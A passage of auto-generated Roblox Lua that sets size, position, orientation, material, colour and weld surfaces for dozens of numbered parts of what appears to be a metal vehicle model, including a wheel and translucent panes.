Part224.FormFactor = Enum.FormFactor.Custom
Part224.Size = Vector3.new(11.8000002, 1.39999998, 0.400000006)
Part224.CFrame = CFrame.new(-10.8097229, 6.70026398, 46.2599983, -1, 6.7584383e-06, -1.16997562e-05, 7.04279182e-06, 1, -3.34411698e-06, 1.74280249e-05, 6.87942702e-07, -1)
Part224.BackSurface = Enum.SurfaceType.Weld
Part224.BottomSurface = Enum.SurfaceType.Weld
Part224.FrontSurface = Enum.SurfaceType.Weld
Part224.LeftSurface = Enum.SurfaceType.Weld
Part224.RightSurface = Enum.SurfaceType.Weld
Part224.TopSurface = Enum.SurfaceType.Weld
Part224.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part224.Position = Vector3.new(-10.8097229, 6.70026398, 46.2599983)
Part224.Orientation = Vector3.new(0, -180, 0)
Part224.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh225.Parent = Part224
Part226.Parent = Model0
Part226.Material = Enum.Material.Metal
Part226.BrickColor = BrickColor.new("Grime")
Part226.Rotation = Vector3.new(-180, 0, -180)
Part226.CanCollide = false
Part226.FormFactor = Enum.FormFactor.Custom
Part226.Size = Vector3.new(7.19999981, 5, 5.19999981)
Part226.CFrame = CFrame.new(-1.30967951, 7.70056057, 33.659565, -1, 7.81613926e-06, -3.46217457e-05, 8.18463377e-06, 0.99999088, 4.60983938e-06, 4.20598662e-05, 9.83004793e-06, -1.00000012)
Part226.BackSurface = Enum.SurfaceType.Weld
Part226.BottomSurface = Enum.SurfaceType.Weld
Part226.FrontSurface = Enum.SurfaceType.Weld
Part226.LeftSurface = Enum.SurfaceType.Weld
Part226.RightSurface = Enum.SurfaceType.Weld
Part226.TopSurface = Enum.SurfaceType.Weld
Part226.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part226.Position = Vector3.new(-1.30967951, 7.70056057, 33.659565)
Part226.Orientation = Vector3.new(0, -180, 0)
Part226.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh227.Parent = Part226
Part228.Parent = Model0
Part228.Material = Enum.Material.Metal
Part228.BrickColor = BrickColor.new("Grime")
Part228.Rotation = Vector3.new(-180, 0, -180)
Part228.CanCollide = false
Part228.FormFactor = Enum.FormFactor.Custom
Part228.Size = Vector3.new(11.8000002, 1.39999998, 0.400000006)
Part228.CFrame = CFrame.new(-10.8100386, 6.70071936, 31.4599133, -1, 7.03509431e-06, -1.81622581e-05, 7.05417779e-06, 1, 3.9548047e-07, 1.85506979e-05, 6.6837697e-07, -1)
Part228.BackSurface = Enum.SurfaceType.Weld
Part228.BottomSurface = Enum.SurfaceType.Weld
Part228.FrontSurface = Enum.SurfaceType.Weld
Part228.LeftSurface = Enum.SurfaceType.Weld
Part228.RightSurface = Enum.SurfaceType.Weld
Part228.TopSurface = Enum.SurfaceType.Weld
Part228.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part228.Position = Vector3.new(-10.8100386, 6.70071936, 31.4599133)
Part228.Orientation = Vector3.new(0, -180, 0)
Part228.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh229.Parent = Part228
Part230.Parent = Model0
Part230.Material = Enum.Material.Metal
Part230.BrickColor = BrickColor.new("Grime")
Part230.Rotation = Vector3.new(-180, 0, -180)
Part230.CanCollide = false
Part230.FormFactor = Enum.FormFactor.Custom
Part230.Size = Vector3.new(7.19999981, 5, 5.19999981)
Part230.CFrame = CFrame.new(-1.30968046, 7.70014811, 44.0596848, -1, 9.28767258e-06, -6.2477724e-05, 9.65974232e-06, 0.99999088, 3.24114408e-05, 7.00270903e-05, 3.77095821e-05, -1.00000012)
Part230.BackSurface = Enum.SurfaceType.Weld
Part230.BottomSurface = Enum.SurfaceType.Weld
Part230.FrontSurface = Enum.SurfaceType.Weld
Part230.LeftSurface = Enum.SurfaceType.Weld
Part230.RightSurface = Enum.SurfaceType.Weld
Part230.TopSurface = Enum.SurfaceType.Weld
Part230.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part230.Position = Vector3.new(-1.30968046, 7.70014811, 44.0596848)
Part230.Orientation = Vector3.new(0, -180, 0)
Part230.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh231.Parent = Part230
Part232.Parent = Model0
Part232.Material = Enum.Material.Metal
Part232.BrickColor = BrickColor.new("Grime")
Part232.Rotation = Vector3.new(-180, -0.00999999978, -180)
Part232.CanCollide = false
Part232.FormFactor = Enum.FormFactor.Custom
Part232.Size = Vector3.new(4, 3.60000014, 0.400000006)
Part232.CFrame = CFrame.new(-23.5095253, 6.40087748, 41.6604347, -1, 1.09171879e-05, -9.79027827e-05, 1.12118551e-05, 1, 2.75443344e-05, 0.000103897743, 3.17625672e-05, -1)
Part232.BackSurface = Enum.SurfaceType.Weld
Part232.BottomSurface = Enum.SurfaceType.Weld
Part232.FrontSurface = Enum.SurfaceType.Weld
Part232.LeftSurface = Enum.SurfaceType.Weld
Part232.RightSurface = Enum.SurfaceType.Weld
Part232.TopSurface = Enum.SurfaceType.Weld
Part232.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part232.Position = Vector3.new(-23.5095253, 6.40087748, 41.6604347)
Part232.Orientation = Vector3.new(0, -179.98999, 0)
Part232.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh233.Parent = Part232
Part234.Parent = Model0
Part234.Material = Enum.Material.Metal
Part234.BrickColor = BrickColor.new("Grime")
Part234.Rotation = Vector3.new(180, 0, -180)
Part234.CanCollide = false
Part234.FormFactor = Enum.FormFactor.Custom
Part234.Size = Vector3.new(0.200000003, 4.19999981, 4.4000001)
Part234.CFrame = CFrame.new(-16.8097973, 8.10076141, 33.6598473, -1, 8.92862408e-06, -5.77830069e-05, 8.94776349e-06, 1, -8.51531922e-07, 5.81714412e-05, -5.790248e-07, -1)
Part234.BackSurface = Enum.SurfaceType.Weld
Part234.BottomSurface = Enum.SurfaceType.Weld
Part234.FrontSurface = Enum.SurfaceType.Weld
Part234.LeftSurface = Enum.SurfaceType.Weld
Part234.RightSurface = Enum.SurfaceType.Weld
Part234.TopSurface = Enum.SurfaceType.Weld
Part234.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part234.Position = Vector3.new(-16.8097973, 8.10076141, 33.6598473)
Part234.Orientation = Vector3.new(0, -180, 0)
Part234.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh235.Parent = Part234
Part236.Parent = Model0
Part236.Material = Enum.Material.Ice
Part236.BrickColor = BrickColor.new("Dark stone grey")
Part236.Transparency = 0.5
Part236.Rotation = Vector3.new(172.399994, 0, -180)
Part236.CanCollide = false
Part236.FormFactor = Enum.FormFactor.Custom
Part236.Size = Vector3.new(3, 2.5999999, 0.200000003)
Part236.CFrame = CFrame.new(-24.2096062, 8.73111153, 46.5839996, -1, 1.03770833e-06, -6.15868048e-05, 1.03748134e-05, 0.991209269, -0.132304236, 8.50215365e-05, -0.132287398, -0.991211414)
Part236.BackSurface = Enum.SurfaceType.Weld
Part236.BottomSurface = Enum.SurfaceType.Weld
Part236.FrontSurface = Enum.SurfaceType.Weld
Part236.LeftSurface = Enum.SurfaceType.Weld
Part236.RightSurface = Enum.SurfaceType.Weld
Part236.TopSurface = Enum.SurfaceType.Weld
Part236.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part236.Position = Vector3.new(-24.2096062, 8.73111153, 46.5839996)
Part236.Orientation = Vector3.new(7.5999999, -180, 0)
Part236.Color = Color3.new(0.388235, 0.372549, 0.384314)
BlockMesh237.Parent = Part236
BlockMesh237.Offset = Vector3.new(0, 0, 0.200000003)
BlockMesh237.Scale = Vector3.new(1, 1.14999998, 0.5)
BlockMesh237.Scale = Vector3.new(1, 1.14999998, 0.5)
Part238.Parent = Model0
Part238.Material = Enum.Material.Metal
Part238.BrickColor = BrickColor.new("Grime")
Part238.Rotation = Vector3.new(180, 0, -180)
Part238.CanCollide = false
Part238.FormFactor = Enum.FormFactor.Custom
Part238.Size = Vector3.new(22, 0.799999714, 0.600000441)
Part238.CFrame = CFrame.new(-5.70983505, 8.60029507, 41.1600647, -1, 6.14293958e-06, -2.86971044e-07, 6.52252311e-06, 0.99999088, -2.05128945e-05, 7.94687185e-06, -1.51366112e-05, -1.00000012)
Part238.BackSurface = Enum.SurfaceType.Weld
Part238.BottomSurface = Enum.SurfaceType.Weld
Part238.FrontSurface = Enum.SurfaceType.Weld
Part238.LeftSurface = Enum.SurfaceType.Weld
Part238.RightSurface = Enum.SurfaceType.Weld
Part238.TopSurface = Enum.SurfaceType.Weld
Part238.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part238.Position = Vector3.new(-5.70983505, 8.60029507, 41.1600647)
Part238.Orientation = Vector3.new(0, -180, 0)
Part238.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh239.Parent = Part238
Part240.Parent = Model0
Part240.Material = Enum.Material.Metal
Part240.BrickColor = BrickColor.new("Grime")
Part240.Rotation = Vector3.new(-180, 0, -180)
Part240.CanCollide = false
Part240.FormFactor = Enum.FormFactor.Custom
Part240.Size = Vector3.new(1.59999919, 0.799999952, 5.19999981)
Part240.CFrame = CFrame.new(3.09039879, 6.80017376, 33.6598129, -1, 7.68635618e-06, -3.03721881e-05, 7.69642338e-06, 1, 9.77274976e-06, 3.05831309e-05, 9.92072819e-06, -1)
Part240.BackSurface = Enum.SurfaceType.Weld
Part240.BottomSurface = Enum.SurfaceType.Weld
Part240.FrontSurface = Enum.SurfaceType.Weld
Part240.LeftSurface = Enum.SurfaceType.Weld
Part240.RightSurface = Enum.SurfaceType.Weld
Part240.TopSurface = Enum.SurfaceType.Weld
Part240.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part240.Position = Vector3.new(3.09039879, 6.80017376, 33.6598129)
Part240.Orientation = Vector3.new(0, -180, 0)
Part240.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh241.Parent = Part240
Part242.Parent = Model0
Part242.Material = Enum.Material.Ice
Part242.BrickColor = BrickColor.new("Dark stone grey")
Part242.Transparency = 0.5
Part242.Rotation = Vector3.new(172.399994, -0.00999999978, 180)
Part242.CanCollide = false
Part242.FormFactor = Enum.FormFactor.Custom
Part242.Size = Vector3.new(6, 2, 0.200000003)
Part242.CFrame = CFrame.new(-19.709465, 8.82992744, 46.5701866, -1, -7.48528237e-06, -0.000163338729, 1.53728633e-05, 0.991222322, -0.132206306, 0.000187008089, -0.132189468, -0.991224468)
Part242.BackSurface = Enum.SurfaceType.Weld
Part242.BottomSurface = Enum.SurfaceType.Weld
Part242.FrontSurface = Enum.SurfaceType.Weld
Part242.LeftSurface = Enum.SurfaceType.Weld
Part242.RightSurface = Enum.SurfaceType.Weld
Part242.TopSurface = Enum.SurfaceType.Weld
Part242.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part242.Position = Vector3.new(-19.709465, 8.82992744, 46.5701866)
Part242.Orientation = Vector3.new(7.5999999, -179.98999, 0)
Part242.Color = Color3.new(0.388235, 0.372549, 0.384314)
BlockMesh243.Parent = Part242
BlockMesh243.Offset = Vector3.new(0, 0, 0.200000003)
BlockMesh243.Scale = Vector3.new(1, 1.14999998, 0.5)
BlockMesh243.Scale = Vector3.new(1, 1.14999998, 0.5)
Part244.Parent = Model0
Part244.Material = Enum.Material.Metal
Part244.BrickColor = BrickColor.new("Grime")
Part244.Rotation = Vector3.new(-180, 0, -180)
Part244.CanCollide = false
Part244.FormFactor = Enum.FormFactor.Custom
Part244.Size = Vector3.new(22, 0.200000003, 5.20000029)
Part244.CFrame = CFrame.new(-5.70976353, 8.10029221, 38.8601913, -1, 7.18417186e-06, -2.02370084e-05, 7.56368945e-06, 0.99999088, 2.50288394e-06, 2.78970601e-05, 7.87922181e-06, -1.00000012)
Part244.BackSurface = Enum.SurfaceType.Weld
Part244.BottomSurface = Enum.SurfaceType.Weld
Part244.FrontSurface = Enum.SurfaceType.Weld
Part244.LeftSurface = Enum.SurfaceType.Weld
Part244.RightSurface = Enum.SurfaceType.Weld
Part244.TopSurface = Enum.SurfaceType.Weld
Part244.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part244.Position = Vector3.new(-5.70976353, 8.10029221, 38.8601913)
Part244.Orientation = Vector3.new(0, -180, 0)
Part244.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh245.Parent = Part244
Part246.Parent = Model0
Part246.Material = Enum.Material.Metal
Part246.BrickColor = BrickColor.new("Grime")
Part246.Rotation = Vector3.new(180, 0, -180)
Part246.CanCollide = false
Part246.FormFactor = Enum.FormFactor.Custom
Part246.Size = Vector3.new(0.799999237, 4.20000029, 0.400000006)
Part246.CFrame = CFrame.new(-17.109623, 8.10075474, 36.0598869, -1, 8.79787513e-06, -5.50586119e-05, 8.82257518e-06, 1, -2.83478767e-06, 5.55580045e-05, -2.48424249e-06, -1)
Part246.BackSurface = Enum.SurfaceType.Weld
Part246.BottomSurface = Enum.SurfaceType.Weld
Part246.FrontSurface = Enum.SurfaceType.Weld
Part246.LeftSurface = Enum.SurfaceType.Weld
Part246.RightSurface = Enum.SurfaceType.Weld
Part246.TopSurface = Enum.SurfaceType.Weld
Part246.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part246.Position = Vector3.new(-17.109623, 8.10075474, 36.0598869)
Part246.Orientation = Vector3.new(0, -180, 0)
Part246.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh247.Parent = Part246
Part248.Name = "wheel"
Part248.Parent = Model0
Part248.Material = Enum.Material.Metal
Part248.BrickColor = BrickColor.new("Grime")
Part248.Transparency = 1
Part248.Rotation = Vector3.new(90, 90, 0)
Part248.FormFactor = Enum.FormFactor.Symmetric
Part248.Friction = 1
Part248.Shape = Enum.PartType.Ball
Part248.Size = Vector3.new(5, 5, 5)
Part248.CFrame = CFrame.new(-22.5099754, 2.99934292, 28.5597458, 1.68583483e-05, 9.94351055e-08, 1, 1, 4.67716745e-08, -1.68586612e-05, -3.92897164e-08, 1, -1.10534181e-07)
Part248.BottomSurface = Enum.SurfaceType.Smooth
Part248.TopSurface = Enum.SurfaceType.Hinge
Part248.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part248.Position = Vector3.new(-22.5099754, 2.99934292, 28.5597458)
Part248.Orientation = Vector3.new(0, 90, 90)
Part248.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh249.Parent = Part248
CylinderMesh249.Offset = Vector3.new(0, -1.10000002, 0)
CylinderMesh249.Scale = Vector3.new(1, 0.600000024, 1)
CylinderMesh249.Scale = Vector3.new(1, 0.600000024, 1)
Part250.Parent = Model0
Part250.Material = Enum.Material.Metal
Part250.BrickColor = BrickColor.new("Grime")
Part250.Rotation = Vector3.new(180, 0, -180)
Part250.FormFactor = Enum.FormFactor.Custom
Part250.Size = Vector3.new(22.7999992, 3.99999976, 5.20000029)
Part250.CFrame = CFrame.new(-6.10987282, 6.00021553, 38.8599777, -1, 6.44594638e-06, -5.42557655e-06, 6.45635237e-06, 1, -7.76254092e-06, 5.63639105e-06, -7.6143624e-06, -1)
Part250.BottomSurface = Enum.SurfaceType.Weld
Part250.LeftSurface = Enum.SurfaceType.Weld
Part250.RightSurface = Enum.SurfaceType.Weld
Part250.TopSurface = Enum.SurfaceType.Weld
Part250.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part250.Position = Vector3.new(-6.10987282, 6.00021553, 38.8599777)
Part250.Orientation = Vector3.new(0, -180, 0)
Part250.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh251.Parent = Part250
Part252.Parent = Model0
Part252.Material = Enum.Material.Metal
Part252.BrickColor = BrickColor.new("Grime")
Part252.Rotation = Vector3.new(-180, 0, -180)
Part252.FormFactor = Enum.FormFactor.Custom
Part252.Size = Vector3.new(9.00000095, 0.800000072, 5.20000029)
Part252.CFrame = CFrame.new(-22.0095825, 4.40028095, 38.8602219, -1, 7.54429402e-06, -2.79332871e-05, 7.55442079e-06, 1, 8.47021511e-06, 2.81442171e-05, 8.61821627e-06, -1)
Part252.BackSurface = Enum.SurfaceType.Weld
Part252.BottomSurface = Enum.SurfaceType.Weld
Part252.FrontSurface = Enum.SurfaceType.Weld
Part252.LeftSurface = Enum.SurfaceType.Weld
Part252.RightSurface = Enum.SurfaceType.Weld
Part252.TopSurface = Enum.SurfaceType.Weld
Part252.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part252.Position = Vector3.new(-22.0095825, 4.40028095, 38.8602219)
Part252.Orientation = Vector3.new(0, -180, 0)
Part252.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh253.Parent = Part252
Part254.Parent = Model0
Part254.Material = Enum.Material.Metal
Part254.BrickColor = BrickColor.new("Grime")
Part254.Rotation = Vector3.new(-180, 0, -180)
Part254.CanCollide = false
Part254.FormFactor = Enum.FormFactor.Custom
Part254.Size = Vector3.new(8, 2.79999995, 0.400000006)
Part254.CFrame = CFrame.new(-21.5101471, 6.00087833, 31.2600803, -1, 6.5851641e-06, -8.26637188e-06, 6.74582452e-06, 0.999991715, 1.20076311e-05, 1.15773773e-05, 1.42274675e-05, -1.00000143)
Part254.BottomSurface = Enum.SurfaceType.Weld
Part254.FrontSurface = Enum.SurfaceType.Weld
Part254.LeftSurface = Enum.SurfaceType.Weld
Part254.RightSurface = Enum.SurfaceType.Weld
Part254.TopSurface = Enum.SurfaceType.Weld
Part254.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part254.Position = Vector3.new(-21.5101471, 6.00087833, 31.2600803)
Part254.Orientation = Vector3.new(0, -180, 0)
Part254.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh255.Parent = Part254
Part256.Parent = Model0
Part256.Material = Enum.Material.Metal
Part256.BrickColor = BrickColor.new("Grime")
Part256.Rotation = Vector3.new(180, 0, -180)
Part256.FormFactor = Enum.FormFactor.Custom
Part256.Size = Vector3.new(8, 1.20000005, 5.19999981)
Part256.CFrame = CFrame.new(-21.5099373, 3.40028739, 33.6600609, -1, 6.41632732e-06, -4.81871075e-06, 6.4790911e-06, 1, -8.07724973e-06, 6.09494327e-06, -7.18019601e-06, -1)
Part256.BottomSurface = Enum.SurfaceType.Weld
Part256.LeftSurface = Enum.SurfaceType.Weld
Part256.RightSurface = Enum.SurfaceType.Weld
Part256.TopSurface = Enum.SurfaceType.Weld
Part256.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part256.Position = Vector3.new(-21.5099373, 3.40028739, 33.6600609)
Part256.Orientation = Vector3.new(0, -180, 0)
Part256.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh257.Parent = Part256
Part258.Parent = Model0
Part258.Material = Enum.Material.Metal
Part258.BrickColor = BrickColor.new("Grime")
Part258.Rotation = Vector3.new(180, 0, -180)
Part258.CanCollide = false
Part258.FormFactor = Enum.FormFactor.Custom
Part258.Size = Vector3.new(8, 2.79999995, 0.400000006)
Part258.CFrame = CFrame.new(-21.509985, 6.00044394, 46.4600868, -1, 8.28853172e-06, -4.09939275e-05, 8.58829844e-06, 1, -3.20226973e-05, 4.70105078e-05, -2.77881045e-05, -1)
Part258.BackSurface = Enum.SurfaceType.Weld
Part258.BottomSurface = Enum.SurfaceType.Weld
Part258.LeftSurface = Enum.SurfaceType.Weld
Part258.RightSurface = Enum.SurfaceType.Weld
Part258.TopSurface = Enum.SurfaceType.Weld
Part258.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part258.Position = Vector3.new(-21.509985, 6.00044394, 46.4600868)
Part258.Orientation = Vector3.new(0, -180, 0)
Part258.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh259.Parent = Part258
Part260.Parent = Model0
Part260.Material = Enum.Material.Metal
Part260.BrickColor = BrickColor.new("Grime")
Part260.Rotation = Vector3.new(-180, 0, -180)
Part260.FormFactor = Enum.FormFactor.Custom
Part260.Size = Vector3.new(8, 0.600000083, 5.19999981)
Part260.CFrame = CFrame.new(-21.509903, 4.3003602, 44.0600548, -1, 5.38951872e-06, 1.67202743e-05, 5.68799487e-06, 1, 1.31562274e-06, -1.07034357e-05, 5.55068073e-06, -1)
Part260.BackSurface = Enum.SurfaceType.Weld
Part260.BottomSurface = Enum.SurfaceType.Weld
Part260.LeftSurface = Enum.SurfaceType.Weld
Part260.RightSurface = Enum.SurfaceType.Weld
Part260.TopSurface = Enum.SurfaceType.Weld
Part260.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part260.Position = Vector3.new(-21.509903, 4.3003602, 44.0600548)
Part260.Orientation = Vector3.new(0, 180, 0)
Part260.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh261.Parent = Part260
Part262.Parent = Model0
Part262.Material = Enum.Material.Metal
Part262.BrickColor = BrickColor.new("Grime")
Part262.Rotation = Vector3.new(172.399994, 0, -180)
Part262.CanCollide = false
Part262.FormFactor = Enum.FormFactor.Custom
Part262.Size = Vector3.new(6, 0.400000036, 0.200000003)
Part262.CFrame = CFrame.new(-19.7101326, 7.64007092, 46.7289124, -1, 7.62399668e-06, 1.59960618e-05, 6.63972241e-06, 0.991217554, -0.132242054, 7.24958954e-06, -0.132225215, -0.991219759)
Part262.BackSurface = Enum.SurfaceType.Weld
Part262.BottomSurface = Enum.SurfaceType.Weld
Part262.FrontSurface = Enum.SurfaceType.Weld
Part262.LeftSurface = Enum.SurfaceType.Weld
Part262.RightSurface = Enum.SurfaceType.Weld
Part262.TopSurface = Enum.SurfaceType.Weld
Part262.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part262.Position = Vector3.new(-19.7101326, 7.64007092, 46.7289124)
Part262.Orientation = Vector3.new(7.5999999, 180, 0)
Part262.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh263.Parent = Part262
BlockMesh263.Offset = Vector3.new(0, 0, 0.200000003)
BlockMesh263.Scale = Vector3.new(1, 1.14999998, 1)
BlockMesh263.Scale = Vector3.new(1, 1.14999998, 1)
Part264.Parent = Model0
Part264.Material = Enum.Material.Metal
Part264.BrickColor = BrickColor.new("Grime")
Part264.Rotation = Vector3.new(-180, 0, -180)
Part264.CanCollide = false
Part264.FormFactor = Enum.FormFactor.Custom
Part264.Size = Vector3.new(4.79999924, 4.20000029, 0.400000006)
Part264.CFrame = CFrame.new(-19.1095543, 8.10087967, 41.6602554, -1, 1.00066009e-05, -7.96175955e-05, 1.02973845e-05, 1, 1.46885304e-05, 8.55014368e-05, 1.88290433e-05, -1)
Part264.BackSurface = Enum.SurfaceType.Weld
Part264.BottomSurface = Enum.SurfaceType.Weld
Part264.FrontSurface = Enum.SurfaceType.Weld
Part264.LeftSurface = Enum.SurfaceType.Weld
Part264.RightSurface = Enum.SurfaceType.Weld
Part264.TopSurface = Enum.SurfaceType.Weld
Part264.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part264.Position = Vector3.new(-19.1095543, 8.10087967, 41.6602554)
Part264.Orientation = Vector3.new(0, -180, 0)
Part264.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh265.Parent = Part264
Part266.Parent = Model0
Part266.Material = Enum.Material.Metal
Part266.BrickColor = BrickColor.new("Grime")
Part266.Rotation = Vector3.new(-180, 0, -180)
Part266.CanCollide = false
Part266.FormFactor = Enum.FormFactor.Custom
Part266.Size = Vector3.new(3.99999928, 5.60000038, 0.400000006)
Part266.CFrame = CFrame.new(-19.5095768, 7.40064335, 36.0599785, -1, 9.13069925e-06, -6.21806248e-05, 9.83368318e-06, 0.99999088, 2.60451998e-06, 7.64155848e-05, 1.2662108e-05, -1.00000012)
Part266.BackSurface = Enum.SurfaceType.Weld
Part266.BottomSurface = Enum.SurfaceType.Weld
Part266.FrontSurface = Enum.SurfaceType.Weld
Part266.LeftSurface = Enum.SurfaceType.Weld
Part266.RightSurface = Enum.SurfaceType.Weld
Part266.TopSurface = Enum.SurfaceType.Weld
Part266.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part266.Position = Vector3.new(-19.5095768, 7.40064335, 36.0599785)
Part266.Orientation = Vector3.new(0, -180, 0)
Part266.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh267.Parent = Part266
Part268.Parent = Model0
Part268.Material = Enum.Material.Metal
Part268.BrickColor = BrickColor.new("Grime")
Part268.Rotation = Vector3.new(-180, 0, -180)
Part268.CanCollide = false
Part268.FormFactor = Enum.FormFactor.Custom
Part268.Size = Vector3.new(3.99999928, 1.40000033, 0.400000006)
Part268.CFrame = CFrame.new(-19.5098534, 5.30032063, 41.6600571, -1, 7.29569683e-06, -2.24659452e-05, 7.88762736e-06, 1, 4.21738878e-06, 3.43997672e-05, 1.26169134e-05, -1)
Part268.BackSurface = Enum.SurfaceType.Weld
Part268.BottomSurface = Enum.SurfaceType.Weld
Part268.FrontSurface = Enum.SurfaceType.Weld
Part268.LeftSurface = Enum.SurfaceType.Weld
Part268.RightSurface = Enum.SurfaceType.Weld
Part268.TopSurface = Enum.SurfaceType.Weld
Part268.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part268.Position = Vector3.new(-19.5098534, 5.30032063, 41.6600571)
Part268.Orientation = Vector3.new(0, -180, 0)
Part268.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh269.Parent = Part268
Part270.Parent = Model0
Part270.Material = Enum.Material.Metal
Part270.BrickColor = BrickColor.new("Grime")
Part270.Rotation = Vector3.new(-180, 0, -180)
Part270.FormFactor = Enum.FormFactor.Custom
Part270.Size = Vector3.new(8, 0.600000083, 5.19999981)
Part270.CFrame = CFrame.new(-21.5100098, 4.30057859, 33.6601372, -1, 6.76650234e-06, -2.10475282e-05, 6.92721051e-06, 0.999991715, 2.39840938e-06, 2.43584891e-05, 4.61806076e-06, -1.00000143)
Part270.BottomSurface = Enum.SurfaceType.Weld
Part270.FrontSurface = Enum.SurfaceType.Weld
Part270.LeftSurface = Enum.SurfaceType.Weld
Part270.RightSurface = Enum.SurfaceType.Weld
Part270.TopSurface = Enum.SurfaceType.Weld
Part270.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part270.Position = Vector3.new(-21.5100098, 4.30057859, 33.6601372)
Part270.Orientation = Vector3.new(0, -180, 0)
Part270.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh271.Parent = Part270
Part272.Parent = Model0
Part272.Material = Enum.Material.Metal
Part272.BrickColor = BrickColor.new("Grime")
Part272.Rotation = Vector3.new(180, 0, -180)
Part272.FormFactor = Enum.FormFactor.Custom
Part272.Size = Vector3.new(9.40000057, 3.19999981, 5.20000029)
Part272.CFrame = CFrame.new(-22.2094765, 6.40075827, 38.8604355, -1, 7.93084837e-06, -3.66540953e-05, 8.22882612e-06, 1, -1.67581202e-05, 4.26486076e-05, -1.25390716e-05, -1)
Part272.BackSurface = Enum.SurfaceType.Weld
Part272.BottomSurface = Enum.SurfaceType.Weld
Part272.FrontSurface = Enum.SurfaceType.Weld
Part272.LeftSurface = Enum.SurfaceType.Weld
Part272.RightSurface = Enum.SurfaceType.Weld
Part272.TopSurface = Enum.SurfaceType.Weld
Part272.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part272.Position = Vector3.new(-22.2094765, 6.40075827, 38.8604355)
Part272.Orientation = Vector3.new(0, -180, 0)
Part272.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh273.Parent = Part272
Part274.Parent = Model0
Part274.Material = Enum.Material.Metal
Part274.BrickColor = BrickColor.new("Grime")
Part274.Rotation = Vector3.new(-180, -0.00999999978, -180)
Part274.CanCollide = false
Part274.FormFactor = Enum.FormFactor.Custom
Part274.Size = Vector3.new(0.200000003, 4.19999981, 4.4000001)
Part274.CFrame = CFrame.new(-16.8093033, 8.10082817, 44.0597496, -1, 1.14173636e-05, -0.000108378299, 1.16978508e-05, 1, 3.53243195e-05, 0.00011410701, 3.93551636e-05, -1)
Part274.BackSurface = Enum.SurfaceType.Weld
Part274.BottomSurface = Enum.SurfaceType.Weld
Part274.FrontSurface = Enum.SurfaceType.Weld
Part274.LeftSurface = Enum.SurfaceType.Weld
Part274.RightSurface = Enum.SurfaceType.Weld
Part274.TopSurface = Enum.SurfaceType.Weld
Part274.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part274.Position = Vector3.new(-16.8093033, 8.10082817, 44.0597496)
Part274.Orientation = Vector3.new(0, -179.98999, 0)
Part274.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh275.Parent = Part274
Part276.Parent = Model0
Part276.Material = Enum.Material.Metal
Part276.BrickColor = BrickColor.new("Grime")
Part276.Rotation = Vector3.new(-180, 0, -180)
Part276.CanCollide = false
Part276.FormFactor = Enum.FormFactor.Custom
Part276.Size = Vector3.new(0.799999237, 1.40000033, 0.400000006)
Part276.CFrame = CFrame.new(-17.1096954, 6.70062399, 31.2602272, -1, 7.63167918e-06, -3.04036766e-05, 7.79194579e-06, 0.999991715, 1.59272313e-05, 3.37147576e-05, 1.81469222e-05, -1.00000143)
Part276.BackSurface = Enum.SurfaceType.Weld
Part276.BottomSurface = Enum.SurfaceType.Weld
Part276.FrontSurface = Enum.SurfaceType.Weld
Part276.LeftSurface = Enum.SurfaceType.Weld
Part276.RightSurface = Enum.SurfaceType.Weld
Part276.TopSurface = Enum.SurfaceType.Weld
Part276.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part276.Position = Vector3.new(-17.1096954, 6.70062399, 31.2602272)
Part276.Orientation = Vector3.new(0, -180, 0)
Part276.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh277.Parent = Part276
Part278.Parent = Model0
Part278.Material = Enum.Material.Metal
Part278.BrickColor = BrickColor.new("Grime")
Part278.Rotation = Vector3.new(180, 0, -180)
Part278.CanCollide = false
Part278.FormFactor = Enum.FormFactor.Custom
Part278.Size = Vector3.new(0.799999714, 1.39999998, 0.400000006)
